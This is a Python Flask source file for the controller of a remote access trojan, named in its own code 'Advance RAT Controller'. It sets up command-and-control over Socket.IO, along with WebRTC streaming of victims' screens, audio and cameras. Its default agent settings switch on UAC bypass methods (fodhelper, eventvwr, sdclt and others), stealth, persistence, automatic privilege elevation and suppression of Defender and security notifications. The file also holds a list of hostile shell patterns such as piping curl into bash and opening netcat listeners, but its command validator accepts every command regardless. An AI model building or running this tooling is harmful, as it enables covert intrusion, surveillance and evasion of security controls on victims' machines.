#final controller
# Optional eventlet monkey patching controlled by env (default off)
import os
_EVENTLET_PATCH = os.environ.get('EVENTLET_MONKEY_PATCH', '0').lower() in ('1', 'true', 'yes')
if _EVENTLET_PATCH:
    try:
        import eventlet
        eventlet.monkey_patch()
        print("Eventlet monkey patch enabled via EVENTLET_MONKEY_PATCH")
    except Exception as _e:
        print(f"Failed to apply eventlet monkey patch: {_e}")

from flask import Flask
from flask_socketio import SocketIO
# rest of imports...
from flask import Flask, request, jsonify, redirect, url_for, Response, send_file, send_from_directory, session, flash, render_template_string, render_template, stream_with_context
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_caching import Cache
from prometheus_flask_exporter import PrometheusMetrics
from pythonjsonlogger import jsonlogger
import logging
import bleach
from markupsafe import escape
from models import SessionLocal, engine, Base, Agent as DbAgent, CommandHistory as DbCommandHistory, ActivityLog as DbActivityLog, AgentGroup as DbAgentGroup, AgentGroupMembership as DbAgentGroupMembership, AuditLog as DbAuditLog
from apscheduler.schedulers.background import BackgroundScheduler
LIMITER_AVAILABLE = False
from collections import defaultdict
import datetime
import time
import os
import base64
import queue
import hashlib
import hmac
import secrets
import threading
import smtplib
from email.mime.text import MIMEText
import json
import re
import mimetypes
from typing import Optional
import io
import uuid
import pyotp
import qrcode
import requests
import json
import re
try:
    import client as agent_client
except Exception:
    agent_client = None
AGENT_OVERRIDES = {
    'bypasses': {},
    'registry': {},
    'admin': {},
    'flags': {
        'bypasses': {},
        'registry': {},
    },
    'admin': {}
}

def verify_totp_code(secret: str, otp: str, window: int = 2) -> bool:
    try:
        totp = pyotp.TOTP(secret)
        now = time.time()
        if totp.verify(str(otp), valid_window=window):
            return True
        for k in range(1, window + 1):
            if totp.verify(str(otp), for_time=now + k * totp.interval):
                return True
            if totp.verify(str(otp), for_time=now - k * totp.interval):
                return True
        return False
    except Exception as _e:
        print(f"TOTP verify error: {_e}")
        return False

def get_or_create_totp_secret() -> str:
    s = load_settings()
    auth = s.get('authentication', {})
    secret = auth.get('totpSecret')
    if not secret:
        secret = pyotp.random_base32()
        issuer = auth.get('issuer') or 'Neural Control Hub'
        auth['totpSecret'] = secret
        auth['requireTwoFactor'] = True
        auth['issuer'] = issuer
        s['authentication'] = auth
        save_settings(s)
    return secret

def _derive_key(secret_key: str, salt: bytes, length: int) -> bytes:
    return hashlib.pbkdf2_hmac('sha256', secret_key.encode('utf-8'), salt, 100_000, dklen=length)

def encrypt_secret(plaintext: str, secret_key: str):
    raw = plaintext.encode('utf-8')
    salt = os.urandom(16)
    keystream = _derive_key(secret_key, salt, len(raw))
    cipher = bytes(a ^ b for a, b in zip(raw, keystream))
    return base64.urlsafe_b64encode(cipher).decode('utf-8'), base64.urlsafe_b64encode(salt).decode('utf-8')

def decrypt_secret(cipher_b64: str, salt_b64: str, secret_key: str) -> Optional[str]:
    try:
        cipher = base64.urlsafe_b64decode(cipher_b64.encode('utf-8'))
        salt = base64.urlsafe_b64decode(salt_b64.encode('utf-8'))
        keystream = _derive_key(secret_key, salt, len(cipher))
        raw = bytes(a ^ b for a, b in zip(cipher, keystream))
        return raw.decode('utf-8')
    except Exception:
        return None

def verify_totp_code(secret: str, otp: str, window: int = 2) -> bool:
    try:
        totp = pyotp.TOTP(secret)
        now = time.time()
        if totp.verify(str(otp), valid_window=window):
            return True
        for k in range(1, window + 1):
            if totp.verify(str(otp), for_time=now + k * totp.interval):
                return True
            if totp.verify(str(otp), for_time=now - k * totp.interval):
                return True
        return False
    except Exception as _e:
        print(f"TOTP verify error: {_e}")
        return False

# WebRTC imports for SFU functionality
try:
    import asyncio
    import aiortc
    from aiortc import RTCPeerConnection, RTCSessionDescription, MediaStreamTrack
    from aiortc.contrib.media import MediaPlayer, MediaRecorder
    from aiortc.mediastreams import MediaStreamError
    WEBRTC_AVAILABLE = True
    print("WebRTC (aiortc) support enabled")
except ImportError:
    WEBRTC_AVAILABLE = False
    print("WebRTC (aiortc) not available - falling back to Socket.IO streaming")

WEBRTC_CONFIG = {
    'enabled': WEBRTC_AVAILABLE,
    'ice_servers': [
        {'urls': 'stun:stun.l.google.com:19302'},
        {'urls': 'stun:stun1.l.google.com:19302'},
        {'urls': 'stun:stun2.l.google.com:19302'},
        {'urls': 'stun:stun3.l.google.com:19302'},
        {'urls': 'stun:stun4.l.google.com:19302'}
    ],
    'codecs': {
        'video': ['H.264', 'VP9', 'VP8'],
        'audio': ['Opus', 'PCM']
    },
    'simulcast': True,
    'svc': True,
    'bandwidth_estimation': True,
    'adaptive_bitrate': True,
    'frame_dropping': True,
    'quality_levels': {
        'low': {'width': 640, 'height': 480, 'fps': 15, 'bitrate': 500000},
        'medium': {'width': 1280, 'height': 720, 'fps': 30, 'bitrate': 2000000},
        'high': {'width': 1920, 'height': 1080, 'fps': 30, 'bitrate': 5000000},
        'auto': {'adaptive': True, 'min_bitrate': 500000, 'max_bitrate': 10000000}
    },
    'performance_tuning': {
        'keyframe_interval': 2,
        'disable_b_frames': True,
        'ultra_low_latency': True,
        'hardware_acceleration': True,
        'gop_size': 60,
        'max_bitrate_variance': 0.3
    },
    'monitoring': {
        'connection_quality_metrics': True,
        'automatic_reconnection': True,
        'detailed_logging': True,
        'stats_interval': 1000,
        'quality_thresholds': {
            'min_bitrate': 100000,
            'max_latency': 1000,
            'min_fps': 15
        }
    }
}

# Supabase Vault integration (optional)
SUPABASE_URL = os.environ.get('SUPABASE_URL')
SUPABASE_SERVICE_ROLE_KEY = os.environ.get('SUPABASE_SERVICE_ROLE_KEY')
ADMIN_USER_ID = os.environ.get('ADMIN_USER_ID', '00000000-0000-0000-0000-000000000001')

def supabase_rpc(fn: str, payload: dict):
    if not SUPABASE_URL or not SUPABASE_SERVICE_ROLE_KEY:
        return None
    try:
        url = SUPABASE_URL.rstrip('/') + f"/rest/v1/rpc/{fn}"
        headers = {
            'apikey': SUPABASE_SERVICE_ROLE_KEY,
            'Authorization': f'Bearer {SUPABASE_SERVICE_ROLE_KEY}',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        if 200 <= resp.status_code < 300:
            try:
                return resp.json()
            except Exception:
                return resp.text
        print(f"Supabase RPC error {resp.status_code}: {resp.text}")
        return None
    except Exception as e:
        print(f"Supabase RPC exception: {e}")
        return None

def supabase_rpc_user(fn: str, payload: dict, user_jwt: str | None):
    if not SUPABASE_URL:
        return None
    try:
        url = SUPABASE_URL.rstrip('/') + f"/rest/v1/rpc/{fn}"
        headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        if user_jwt:
            headers['Authorization'] = f'Bearer {user_jwt}'
            headers['apikey'] = SUPABASE_SERVICE_ROLE_KEY or ''
        elif SUPABASE_SERVICE_ROLE_KEY:
            headers['Authorization'] = f'Bearer {SUPABASE_SERVICE_ROLE_KEY}'
            headers['apikey'] = SUPABASE_SERVICE_ROLE_KEY
        else:
            return None
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        if 200 <= resp.status_code < 300:
            try:
                return resp.json()
            except Exception:
                return resp.text
        print(f"Supabase RPC (user) error {resp.status_code}: {resp.text}")
        return None
    except Exception as e:
        print(f"Supabase RPC (user) exception: {e}")
        return None

# Configuration Management
class Config:
    """Configuration class for Advance RAT Controller"""
    
    # Admin Authentication
    ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD')
    
    # Validate password strength
    if ADMIN_PASSWORD:
        if len(ADMIN_PASSWORD) < 8:
            raise ValueError("ADMIN_PASSWORD must be at least 8 characters long.")
        if not any(c.isupper() for c in ADMIN_PASSWORD):
            print("Warning: ADMIN_PASSWORD should contain uppercase letters for better security.")
        if not any(c.isdigit() for c in ADMIN_PASSWORD):
            print("Warning: ADMIN_PASSWORD should contain digits for better security.")
    
    # Flask Configuration
    SECRET_KEY = os.environ.get('SECRET_KEY', None)
    
    # Server Configuration
    HOST = os.environ.get('HOST', '0.0.0.0')
    PORT = int(os.environ.get('PORT', 8080))
    
    # Security Settings
    SESSION_TIMEOUT = int(os.environ.get('SESSION_TIMEOUT', 3600))  # 1 hour in seconds
    MAX_LOGIN_ATTEMPTS = int(os.environ.get('MAX_LOGIN_ATTEMPTS', 5))
    LOGIN_TIMEOUT = int(os.environ.get('LOGIN_TIMEOUT', 300))  # 5 minutes lockout
    
    # Password Security Settings
    SALT_LENGTH = 32  # Length of salt in bytes
    HASH_ITERATIONS = 100000  # Number of iterations for PBKDF2

# Initialize Flask app with configuration
app = Flask(__name__)
app.config['SECRET_KEY'] = Config.SECRET_KEY or secrets.token_hex(32)  # Use config or generate secure random key

logHandler = logging.StreamHandler()
formatter = jsonlogger.JsonFormatter('%(asctime)s %(levelname)s %(name)s %(message)s')
logHandler.setFormatter(formatter)
logger = logging.getLogger()
logger.handlers = []
logger.addHandler(logHandler)
logger.setLevel(logging.INFO)

REDIS_URL = os.environ.get("REDIS_URL", "")
limiter = Limiter(app=app, key_func=get_remote_address, storage_uri=REDIS_URL if REDIS_URL else "memory://", default_limits=[])
cache = Cache(app, config={'CACHE_TYPE': 'redis' if REDIS_URL else 'simple', 'CACHE_REDIS_URL': REDIS_URL})
metrics = PrometheusMetrics(app)
Base.metadata.create_all(bind=engine)

def get_db():
    return SessionLocal()

def sanitize_input(data: str, allow_html: bool = False) -> str:
    if not isinstance(data, str):
        return ''
    if not allow_html:
        return str(escape(data))
    allowed_tags = ['b', 'i', 'u', 'em', 'strong', 'a', 'code', 'pre']
    allowed_attrs = {'a': ['href', 'title']}
    return bleach.clean(data, tags=allowed_tags, attributes=allowed_attrs, strip=True)

# Add security headers
@app.after_request
def add_security_headers(response):
    """Add security headers to all responses"""
    response.headers['X-Content-Type-Options'] = 'nosniff'
    if request.path.startswith('/api/agents/') and ('/files/stream' in request.path or '/files/thumbnail' in request.path):
        response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    else:
        response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline' 'unsafe-eval'; "
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
        "font-src 'self' data: https://fonts.gstatic.com; "
        "img-src 'self' data: https:; "
        "connect-src 'self' https: wss: ws:;"
    )
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
    return response

# Defer CORS/socket initialization until after settings helpers are defined
socketio = None

# Optional rate limiting (disabled in this revision)

# -----------------------------
# Settings persistence (JSON)
# -----------------------------
SETTINGS_FILE_PATH = os.environ.get('SETTINGS_FILE_PATH', os.path.join(os.path.dirname(__file__), 'settings.json'))

DEFAULT_SETTINGS = {
    'server': {
        'controllerUrl': f"http://{Config.HOST}:{Config.PORT}",
        'serverPort': Config.PORT,
        'sslEnabled': False,
        'maxAgents': 100,
        'heartbeatInterval': 30,
        'commandTimeout': 30,
        'autoReconnect': True,
        'backupUrl': ''
    },
    'authentication': {
        # Do NOT persist plaintext in production; kept here for parity with UI. Prefer env ADMIN_PASSWORD.
        'operatorPassword': '',
        'sessionTimeout': 30,
        'maxLoginAttempts': 3,
        'requireTwoFactor': False,
        'apiKeyEnabled': True,
        'apiKey': '',
        'trustedDevices': []
        ,
        'totpEnrolled': False
    },
    'email': {
        'enabled': False,
        'smtpServer': 'smtp.gmail.com',
        'smtpPort': 587,
        'username': '',
        'password': '',
        'recipient': '',
        'enableTLS': True,
        'notifyAgentOnline': True,
        'notifyAgentOffline': True,
        'notifyCommandFailure': True,
        'notifySecurityAlert': True
    },
    'agent': {
        'defaultPersistence': True,
        'enableUACBypass': True,
        'enableDefenderDisable': False,
        'enableAdvancedPersistence': True,
        'silentMode': True,
        'quickStartup': False,
        'enableStealth': True,
        'autoElevatePrivileges': True,
        'requestAdminFirst': False,
        'maxPromptAttempts': 3,
        'uacBypassDebug': True,
        'persistentAdminPrompt': False
    },
    'bypasses': {
        'enabled': True,
        'methods': {
            'cleanmgr_sagerun': True,
            'fodhelper': True,
            'computerdefaults': True,
            'eventvwr': True,
            'sdclt': True,
            'wsreset': True,
            'slui': True,
            'winsat': True,
            'silentcleanup': True,
            'icmluautil': True
        }
    },
    'registry': {
        'enabled': True,
        'notificationsEnabled': True,
        'actions': {
            'policy_push_notifications': True,
            'policy_windows_update': True,
            'context_runas_cmd': True,
            'context_powershell_admin': True,
            'notify_center_hkcu': True,
            'notify_center_hklm': True,
            'defender_ux_suppress': True,
            'toast_global_above_lock': True,
            'toast_global_critical_above_lock': True,
            'toast_windows_update': True,
            'toast_security_maintenance': True,
            'toast_windows_security': True,
            'toast_sec_health_ui': True,
            'explorer_balloon_tips': True,
            'explorer_info_tip': True
        }
    },
    'webrtc': {
        'enabled': True,
        'iceServers': [
            'stun:stun.l.google.com:19302',
            'stun:stun1.l.google.com:19302',
            {
                'urls': 'turn:turn.example.com:3478',
                'username': '',
                'credential': ''
            }
        ],
        'maxBitrate': 5000000,
        'adaptiveBitrate': True,
        'frameDropping': True,
        'qualityLevel': 'auto',
        'monitoringEnabled': True
    },
    'security': {
        'encryptCommunication': True,
        'validateCertificates': False,
        'allowSelfSigned': True,
        'rateLimitEnabled': True,
        'rateLimitRequests': 100,
        'rateLimitWindow': 60,
        # Allow configuring additional CORS origins from UI
        'frontendOrigins': [],
        'blocked_ips': []
    }
}

def _deep_update(original: dict, updates: dict) -> dict:
    for key, value in updates.items():
        if isinstance(value, dict) and isinstance(original.get(key), dict):
            _deep_update(original[key], value)
        else:
            original[key] = value
    return original

def load_settings() -> dict:
    try:
        if os.path.exists(SETTINGS_FILE_PATH):
            with open(SETTINGS_FILE_PATH, 'r') as f:
                data = json.load(f)
            # Merge with defaults to ensure missing keys are present
            merged = json.loads(json.dumps(DEFAULT_SETTINGS))
            return _deep_update(merged, data)
    except Exception as e:
        print(f"Failed to load settings.json: {e}")
    return json.loads(json.dumps(DEFAULT_SETTINGS))

def save_settings(data: dict) -> bool:
    try:
        with open(SETTINGS_FILE_PATH, 'w') as f:
            json.dump(data, f, indent=2)
        return True
    except Exception as e:
        print(f"Failed to save settings.json: {e}")
        return False

# Now that settings helpers exist, configure CORS and Socket.IO
allowed_origins = [
    "http://localhost:3000",
    "http://localhost:5173",
    "http://127.0.0.1:3000",
    "http://127.0.0.1:5173",
    "http://localhost:8080",
    "http://127.0.0.1:8080",
    "https://neural-control-hub-frontend.onrender.com",
    "https://agent-controller-backend.onrender.com",
]

try:
    _loaded = load_settings()
    for origin in _loaded.get('security', {}).get('frontendOrigins', []) or []:
        if isinstance(origin, str) and origin not in allowed_origins:
            allowed_origins.append(origin)
    _webrtc = _loaded.get('webrtc', {})
    if _webrtc.get('iceServers') is not None:
        servers = []
        for s in _webrtc['iceServers']:
            if isinstance(s, str):
                servers.append({'urls': s})
            elif isinstance(s, dict):
                if 'urls' in s:
                    merged = {'urls': s['urls']}
                    for k, v in s.items():
                        if k != 'urls':
                            merged[k] = v
                    servers.append(merged)
                else:
                    servers.append(s)
        WEBRTC_CONFIG['ice_servers'] = servers
    if 'enabled' in _webrtc:
        WEBRTC_CONFIG['enabled'] = bool(_webrtc['enabled'])
except Exception as _e:
    print(f"Warning loading dynamic CORS origins: {_e}")

# Add safe wildcard support for Render subdomains using regex (Flask-CORS supports regex)
render_wildcard_regex = r'^https://.*\.onrender\.com$'

CORS(
    app,
    origins=allowed_origins + [render_wildcard_regex],
    supports_credentials=True,
    allow_headers=["Content-Type", "Authorization", "X-Requested-With"]
)

# Initialize Socket.IO with expanded origin allowlist (include render.com wildcard)
render_origins = [
    "https://agent-controller-backend.onrender.com",
    "https://neural-control-hub-frontend.onrender.com"
]
# Add any render.com subdomain variations
for subdomain in ["www", "app", "dashboard", "frontend", "backend"]:
    render_origins.append(f"https://{subdomain}.onrender.com")
    render_origins.append(f"https://agent-controller-{subdomain}.onrender.com")
    render_origins.append(f"https://neural-control-hub-{subdomain}.onrender.com")

all_socketio_origins = allowed_origins + render_origins
# Allow overriding async mode via env, default to threading to avoid eventlet/gevent issues on some platforms
ASYNC_MODE = os.environ.get('SOCKET_ASYNC_MODE', 'threading').strip().lower()
if ASYNC_MODE not in ('threading', 'eventlet', 'gevent', 'gevent_uwsgi', 'asgi'):
    ASYNC_MODE = 'threading'
socketio = SocketIO(
    app,
    async_mode=ASYNC_MODE,
    cors_allowed_origins=all_socketio_origins,
    allow_upgrades=True,
    max_http_buffer_size=50 * 1024 * 1024,
    ping_interval=25,
    ping_timeout=60,
    logger=False,
    engineio_logger=False
)
print(f"Socket.IO CORS origins: {all_socketio_origins}")

def require_socket_auth(f):
    from functools import wraps
    @wraps(f)
    def decorated(*args, **kwargs):
        try:
            if not is_authenticated():
                emit('error', {'message': 'Authentication required'})
                return
        except Exception:
            emit('error', {'message': 'Authentication required'})
            return
        return f(*args, **kwargs)
    return decorated

ALLOWED_COMMANDS = {
    'windows': ['systeminfo', 'tasklist', 'netstat', 'ipconfig', 'whoami'],
    'linux': ['ps', 'netstat', 'ifconfig', 'whoami', 'uname'],
    'common': ['pwd', 'cd', 'ls', 'dir']
}

DANGEROUS_PATTERNS = [
    r'rm\s+-rf\s*/',
    r'del\s+/[sS]\s+/[qQ]',
    r'format\s+',
    r'shutdown',
    r'reboot',
    r'halt',
    r'poweroff',
    r'mkfs',
    r'dd\s+if=',
    r':\(\)\{.*\};:',
    r'wget.*\|.*sh',
    r'curl.*\|.*bash',
    r'nc\s+-l',
    r'bash\s+-i',
    r'exec\s+',
]

def validate_command(command: str, platform: str = 'windows'):
    return True, "Command validated"

AGENT_TOKENS = {}
AGENT_AUTH_REQUIRED = os.environ.get("AGENT_AUTH_REQUIRED", "false").lower() in ("1", "true", "yes")

def generate_agent_token(agent_id: str) -> str:
    token = secrets.token_urlsafe(32)
    AGENT_TOKENS[agent_id] = hashlib.sha256(token.encode()).hexdigest()
    return token

def verify_agent_token(agent_id: str, token: str) -> bool:
    if agent_id not in AGENT_TOKENS:
        return False
    token_hash = hashlib.sha256((token or "").encode()).hexdigest()
    return hmac.compare_digest(AGENT_TOKENS[agent_id], token_hash)

class E2EEncryption:
    def __init__(self, agent_id: str, shared_secret: str):
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
        from cryptography.fernet import Fernet
        import base64 as _b64
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=agent_id.encode(), iterations=100000)
        key = _b64.urlsafe_b64encode(kdf.derive(shared_secret.encode()))
        self.cipher = Fernet(key)
    def encrypt(self, data: str) -> str:
        return self.cipher.encrypt((data or "").encode()).decode()
    def decrypt(self, encrypted: str) -> str:
        return self.cipher.decrypt((encrypted or "").encode()).decode()

class AdaptiveStreamingManager:
    def __init__(self):
        self.quality_levels = {
            'low': {'resolution': (640, 480), 'fps': 15, 'quality': 50},
            'medium': {'resolution': (1280, 720), 'fps': 24, 'quality': 70},
            'high': {'resolution': (1920, 1080), 'fps': 30, 'quality': 85}
        }
        from collections import defaultdict as _dd
        self.agent_quality = _dd(lambda: 'medium')
    def adjust_quality(self, agent_id: str, latency_ms: float, packet_loss: float):
        if latency_ms > 500 or packet_loss > 0.05:
            self.agent_quality[agent_id] = 'low'
        elif latency_ms < 100 and packet_loss < 0.01:
            self.agent_quality[agent_id] = 'high'
        else:
            self.agent_quality[agent_id] = 'medium'

class AuditLogger:
    def __init__(self):
        pass
    def log_action(self, user_id: str, action: str, agent_id: str = None, details: dict = None, severity: str = 'INFO'):
        try:
            db = get_db()
            entry = DbAuditLog(
                user_id=user_id,
                action=action,
                agent_id=agent_id,
                details=json.dumps(details or {}),
                severity=severity,
                ip_address=get_client_ip()
            )
            db.add(entry)
            db.commit()
            db.close()
        except Exception:
            pass

audit = AuditLogger()

def send_email_notification(subject: str, body: str) -> bool:
    try:
        cfg = load_settings().get('email', {})
        if not cfg.get('enabled'):
            return False
        smtp_server = cfg.get('smtpServer')
        smtp_port = int(cfg.get('smtpPort') or 587)
        username = cfg.get('username')
        password = cfg.get('password')
        recipient = cfg.get('recipient')
        if not all([smtp_server, smtp_port, username, password, recipient]):
            print("Email settings incomplete; skipping notification")
            return False
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = username
        msg['To'] = recipient
        server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
        if cfg.get('enableTLS', True):
            server.starttls()
        server.login(username, password)
        server.sendmail(username, [recipient], msg.as_string())
        server.quit()
        return True
    except smtplib.SMTPAuthenticationError as e:
        print(f"SMTP authentication failed: {e}")
        return False
    except smtplib.SMTPConnectError as e:
        print(f"SMTP connection failed: {e}")
        return False
    except smtplib.SMTPException as e:
        print(f"SMTP error: {e}")
        return False
    except Exception as e:
        print(f"Unexpected email notification error: {e}")
        return False

 

# WebRTC Global State
WEBRTC_PEER_CONNECTIONS = {}  # agent_id -> RTCPeerConnection
WEBRTC_STREAMS = {}  # agent_id -> {screen, audio, camera} streams
WEBRTC_VIEWERS = {}  # viewer_id -> {agent_id, pc, streams}

# Production Scale Configuration
PRODUCTION_SCALE = {
    'current_implementation': 'aiortc_sfu',  # Current: aiortc-based SFU
    'target_implementation': 'mediasoup',    # Target: mediasoup for production scale
    'migration_phase': 'planning',           # Current phase: planning
    'scalability_limits': {
        'aiorttc_max_viewers': 50,           # aiortc suitable for smaller setups
        'mediasoup_max_viewers': 1000,       # mediasoup for production scale
        'concurrent_agents': 100,            # Maximum concurrent agents
        'bandwidth_per_agent': 10000000      # 10 Mbps per agent
    },
    'performance_targets': {
        'target_latency': 100,               # 100ms target latency
        'target_bitrate': 5000000,           # 5 Mbps target bitrate
        'target_fps': 30,                    # 30 FPS target
        'max_packet_loss': 0.01              # 1% max packet loss
    }
}

# Security Configuration and Password Management
def generate_salt():
    """Generate a cryptographically secure salt"""
    return secrets.token_bytes(Config.SALT_LENGTH)

def hash_password(password, salt=None):
    """
    Hash a password using PBKDF2 with SHA-256
    
    Args:
        password (str): The password to hash
        salt (bytes, optional): Salt to use. If None, generates a new salt
    
    Returns:
        tuple: (hashed_password, salt) where both are base64 encoded strings
    """
    if salt is None:
        salt = generate_salt()
    elif isinstance(salt, str):
        salt = base64.b64decode(salt)
    
    # Use PBKDF2 with SHA-256 for secure password hashing
    import hashlib
    import hmac
    
    # Create the hash using PBKDF2
    hash_obj = hashlib.pbkdf2_hmac(
        'sha256',
        password.encode('utf-8'),
        salt,
        Config.HASH_ITERATIONS
    )
    
    # Return base64 encoded hash and salt
    return base64.b64encode(hash_obj).decode('utf-8'), base64.b64encode(salt).decode('utf-8')

def verify_password(password, stored_hash, stored_salt):
    """
    Verify a password against a stored hash and salt
    
    Args:
        password (str): The password to verify
        stored_hash (str): The stored hash (base64 encoded)
        stored_salt (str): The stored salt (base64 encoded)
    
    Returns:
        bool: True if password matches, False otherwise
    """
    try:
        # Hash the provided password with the stored salt
        hash_obj, _ = hash_password(password, stored_salt)
        return hmac.compare_digest(hash_obj, stored_hash)
    except Exception as e:
        print(f"Password verification error: {e}")
        return False

def create_secure_password_hash(password):
    """
    Create a secure hash for a password

    Args:
        password (str): The password to hash

    Returns:
        tuple: (hash, salt) both base64 encoded
    """
    return hash_password(password)

def verify_admin_or_operator(password: str) -> bool:
    if ADMIN_PASSWORD_HASH and ADMIN_PASSWORD_SALT and verify_password(password, ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT):
        return True
    try:
        s = load_settings()
        op = (s.get('authentication', {})).get('operatorPassword') or ''
        if op:
            return hmac.compare_digest(op, password)
        return False
    except Exception:
        return False

ADMIN_PASSWORD_HASH = None
ADMIN_PASSWORD_SALT = None
try:
    if Config.ADMIN_PASSWORD:
        ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT = create_secure_password_hash(Config.ADMIN_PASSWORD)
    else:
        print("ADMIN_PASSWORD not set; operatorPassword from settings.json will be used if configured")
except Exception as e:
    print(f"Error creating admin password hash: {e}")
    ADMIN_PASSWORD_HASH = None
    ADMIN_PASSWORD_SALT = None

# WebRTC Utility Functions
def create_webrtc_peer_connection(agent_id):
    """Create a WebRTC peer connection for an agent"""
    if not WEBRTC_AVAILABLE:
        return None
    
    try:
        pc = RTCPeerConnection()
        
        # Configure ICE servers
        for ice_server in WEBRTC_CONFIG['ice_servers']:
            pc.addIceServer(ice_server)
        
        # Store the peer connection
        WEBRTC_PEER_CONNECTIONS[agent_id] = pc
        
        # Set up event handlers
        @pc.on("connectionstatechange")
        async def on_connectionstatechange():
            print(f"WebRTC connection state for {agent_id}: {pc.connectionState}")
            if pc.connectionState == "failed":
                await pc.close()
                if agent_id in WEBRTC_PEER_CONNECTIONS:
                    del WEBRTC_PEER_CONNECTIONS[agent_id]
        
        @pc.on("iceconnectionstatechange")
        async def on_iceconnectionstatechange():
            print(f"ICE connection state for {agent_id}: {pc.iceConnectionState}")
        
        @pc.on("icecandidate")
        def on_agent_icecandidate(candidate):
            try:
                agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
                if agent_sid and candidate:
                    emit('webrtc_ice_candidate', {
                        'agent_id': agent_id,
                        'candidate': candidate
                    }, room=agent_sid)
            except Exception as e:
                print(f"Error emitting ICE candidate to agent {agent_id}: {e}")
        
        @pc.on("track")
        async def on_track(track):
            print(f"Received {track.kind} track from {agent_id}")
            if agent_id not in WEBRTC_STREAMS:
                WEBRTC_STREAMS[agent_id] = {}
            if track.kind not in WEBRTC_STREAMS[agent_id]:
                WEBRTC_STREAMS[agent_id][track.kind] = []
            try:
                WEBRTC_STREAMS[agent_id][track.kind].append(track)
            except Exception:
                WEBRTC_STREAMS[agent_id][track.kind] = [track]
            
            # Forward track to all viewers of this agent
            for viewer_id, viewer_data in WEBRTC_VIEWERS.items():
                if viewer_data['agent_id'] == agent_id:
                    try:
                        sender = viewer_data['pc'].addTrack(track)
                        if track.kind not in viewer_data['streams']:
                            viewer_data['streams'][track.kind] = []
                        viewer_data['streams'][track.kind].append(sender)
                    except Exception as e:
                        print(f"Error forwarding track to viewer {viewer_id}: {e}")
        
        return pc
    except Exception as e:
        print(f"Error creating WebRTC peer connection for {agent_id}: {e}")
        return None

def close_webrtc_connection(agent_id):
    """Close WebRTC connection for an agent"""
    if agent_id in WEBRTC_PEER_CONNECTIONS:
        try:
            pc = WEBRTC_PEER_CONNECTIONS[agent_id]
            # Properly handle async context
            try:
                loop = asyncio.get_event_loop()
                if loop.is_running():
                    # If loop is running, schedule the coroutine
                    future = asyncio.run_coroutine_threadsafe(pc.close(), loop)
                    future.result(timeout=5)  # Wait up to 5 seconds
                else:
                    # If no loop or not running, use asyncio.run
                    asyncio.run(pc.close())
            except (RuntimeError, asyncio.TimeoutError) as e:
                print(f"Warning: Could not cleanly close WebRTC connection for {agent_id}: {e}")
                # Force cleanup even if close fails
                pass
            finally:
                del WEBRTC_PEER_CONNECTIONS[agent_id]
        except Exception as e:
            print(f"Error closing WebRTC connection for {agent_id}: {e}")
    
    if agent_id in WEBRTC_STREAMS:
        del WEBRTC_STREAMS[agent_id]

def get_webrtc_stats(agent_id):
    """Get WebRTC statistics for an agent"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return None
    
    try:
        pc = WEBRTC_PEER_CONNECTIONS[agent_id]
        stats = {
            'connection_state': pc.connectionState,
            'ice_connection_state': pc.iceConnectionState,
            'ice_gathering_state': pc.iceGatheringState,
            'signaling_state': pc.signalingState,
            'local_description': pc.localDescription.sdp if pc.localDescription else None,
            'remote_description': pc.remoteDescription.sdp if pc.remoteDescription else None
        }
        return stats
    except Exception as e:
        print(f"Error getting WebRTC stats for {agent_id}: {e}")
        return None

# Advanced WebRTC Performance Optimization Functions
def estimate_bandwidth(agent_id):
    """Estimate available bandwidth for an agent connection"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return None
    
    try:
        pc = WEBRTC_PEER_CONNECTIONS[agent_id]
        # Get RTCStatsReport for bandwidth estimation
        try:
            loop = asyncio.get_event_loop()
            future = asyncio.run_coroutine_threadsafe(pc.getStats(), loop)
            stats_report = future.result(timeout=5)  # 5 second timeout
        except RuntimeError:
            # No event loop, run synchronously
            stats_report = asyncio.run(pc.getStats())
        
        bandwidth_stats = {
            'available_bandwidth': 0,
            'current_bitrate': 0,
            'packets_lost': 0,
            'rtt': 0,
            'jitter': 0
        }
        
        for stat in stats_report.values():
            if hasattr(stat, 'type'):
                if stat.type == 'inbound-rtp' and stat.mediaType == 'video':
                    bandwidth_stats['current_bitrate'] = getattr(stat, 'bytesReceived', 0) * 8 / 1000  # kbps
                    bandwidth_stats['packets_lost'] = getattr(stat, 'packetsLost', 0)
                elif stat.type == 'candidate-pair' and stat.state == 'succeeded':
                    bandwidth_stats['rtt'] = getattr(stat, 'currentRoundTripTime', 0) * 1000  # ms
                    bandwidth_stats['jitter'] = getattr(stat, 'jitter', 0) * 1000  # ms
        
        # Estimate available bandwidth based on current performance
        if bandwidth_stats['packets_lost'] > 0:
            # Reduce bitrate if packet loss detected
            bandwidth_stats['available_bandwidth'] = max(
                bandwidth_stats['current_bitrate'] * 0.8,
                WEBRTC_CONFIG['quality_levels']['low']['bitrate']
            )
        else:
            # Increase bitrate if no packet loss
            bandwidth_stats['available_bandwidth'] = min(
                bandwidth_stats['current_bitrate'] * 1.2,
                WEBRTC_CONFIG['quality_levels']['high']['bitrate']
            )
        
        return bandwidth_stats
        
    except Exception as e:
        print(f"Error estimating bandwidth for {agent_id}: {e}")
